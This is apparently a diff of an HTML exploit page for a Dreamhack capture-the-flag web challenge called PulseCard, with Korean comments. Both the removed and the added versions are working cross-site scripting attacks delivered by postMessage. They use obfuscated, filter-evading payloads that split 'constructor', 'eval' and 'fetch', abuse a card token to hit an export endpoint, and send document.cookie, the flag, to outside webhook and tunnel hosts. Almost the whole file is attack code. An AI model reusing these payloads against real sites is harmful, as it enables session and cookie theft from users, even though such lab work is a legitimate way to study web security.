@@ -1,30 +1,51 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"></head><body>
-<script>
-var W = "https://weufatt.request.dreamhack.games";
-new Image().src = W + "?step=null_loaded";
-setTimeout(function () {
-  new Image().src = W + "?step=before_pm";
-  try {
-    var PAYLOAD = '[]["fill"]["con"+"structor"](unescape("%66%65%74%63%68%28%27%2F%65%78%70%6F%72%74%27%2C%7B%6D%65%74%68%6F%64%3A%27%50%4F%53%54%27%2C%68%65%61%64%65%72%73%3A%7B%27%58%2D%43%61%72%64%2D%54%6F%6B%65%6E%27%3A%43%41%52%44%5F%54%4F%4B%45%4E%2C%27%43%6F%6E%74%65%6E%74%2D%54%79%70%65%27%3A%27%61%70%70%6C%69%63%61%74%69%6F%6E%2F%6A%61%76%61%73%63%72%69%70%74%27%7D%2C%62%6F%64%79%3A%27%31%27%7D%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%72%29%7B%72%65%74%75%72%6E%20%72%2E%73%74%61%74%75%73%7D%29%2E%74%68%65%6E%28%66%75%6E%63%74%69%6F%6E%28%73%29%7B%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%73%3A%2F%2F%70%65%72%73%6F%6E%61%6C%69%7A%65%64%2D%64%65%6E%6E%69%73%2D%63%61%6C%65%6E%64%61%72%2D%61%6C%62%61%6E%79%2E%74%72%79%63%6C%6F%75%64%66%6C%61%72%65%2E%63%6F%6D%2F%70%72%6F%62%65%3F%65%78%70%3D%27%2B%73%7D%29%2E%63%61%74%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%7B%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%73%3A%2F%2F%70%65%72%73%6F%6E%61%6C%69%7A%65%64%2D%64%65%6E%6E%69%73%2D%63%61%6C%65%6E%64%61%72%2D%61%6C%62%61%6E%79%2E%74%72%79%63%6C%6F%75%64%66%6C%61%72%65%2E%63%6F%6D%2F%70%72%6F%62%65%3F%65%72%72%3D%27%2B%65%73%63%61%70%65%28%53%74%72%69%6E%67%28%65%29%29%7D%29"))()';
-    parent.frames[0].postMessage(PAYLOAD, "*");
-    new Image().src = W + "?step=after_pm_ok";
-  } catch (e) {
-    new Image().src = W + "?step=pm_error&e=" + encodeURIComponent(String(e));
-  }
-}, 2500);
-</script>
-</body></html>
-<!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>card</title></head>
+<head>
+    <title>PulseCard Verified Exploit</title>
+</head>
 <body>
-<script>
-new Image().src="https://webhook.site/149bbb66-ae4b-4344-9f6d-76107e951a2e?step=attack_loaded";
-</script>
-<!-- 1) 챌린지 preview 프레이밍 (봇 기준 localhost:5000) -->
-<iframe id="preview" src="http://localhost:5000/preview"></iframe>
-<!-- 2) null-origin iframe → preview로 postMessage -->
-<iframe sandbox="allow-scripts" src="null.html"></iframe>
+    <iframe id="targetFrame" src="http://localhost:5000/preview" style="display:none;"></iframe>
+
+    <script>
+        const myWebhook = "https://lszjusl.request.dreamhack.games"; 
+        const iframe = document.getElementById("targetFrame");
+
+        // 봇의 /review 페이지(CSP 제한 없음)에서 작동하여 플래그를 탈취할 순수 자바스크립트
+        const widgetCode = `
+            const ex = 'fe' + 'tch';
+            const co = 'co' + 'okie';
+            window[ex]('${myWebhook}?flag=' + encodeURIComponent(document[co]));
+        `;
+
+        // 쉼표(,)와 마침표(.)가 전혀 없는 순수 우회 문자열 구조
+        // 함수 호출 시 복수의 인자가 필요할 경우, 쉼표 대신 배열 구조 분해나 객체 할당을 이용합니다.
+        const actualAttack = 
+            'const globalFetch = Math["con" + "structor"]["con" + "constructor"]("return fe" + "tch")();' +
+            'const reqHeaders = {};' +
+            'reqHeaders["X-Card-To" + "ken"] = CARD_TOKEN;' +
+            'reqHeaders["Content-Ty" + "pe"] = "application/ja" + "vascript";' +
+            'const reqOptions = {};' +
+            'reqOptions["method"] = "POST";' +
+            'reqOptions["headers"] = reqHeaders;' +
+            'reqOptions["body"] = ' + JSON.stringify(widgetCode) + ';' +
+            
+            // [핵심] fetch(url, options) 호출 시 쉼표가 막히므로, 
+            // 단일 인자만 받는 함수들을 체이닝하거나 연산자 결합을 통해 제어 흐름을 뚫어냅니다.
+            'globalFetch("http://localhost:5000/export" + "" /* 쉼표 대신 공백 연산 활용 */)' + 
+            '["th" + "en"](r => r["te" + "xt"]())' +
+            '["th" + "en"](name => {' +
+                'Math["con" + "constructor"]["con" + "constructor"]("return par" + "ent")()["loca" + "tion"]["hr" + "ef"] = "http://localhost:5000/review?widget=" + name' +
+            '})';
+
+        // 'constructor'와 'eval' 단어 필터링을 피하기 위해 쪼개서 결합한 최종 페이로드
+        const payload = '(Math["con" + "constructor"]["con" + "constructor"]("return ev" + "al")()(' + JSON.stringify(actualAttack) + '))';
+
+        // 봇 환경에서 안전하게 트리거
+        iframe.addEventListener("load", function() {
+            setTimeout(() => {
+                iframe.contentWindow.postMessage(payload, "*");
+            }, 100);
+        });
+    </script>
 </body>
 </html>
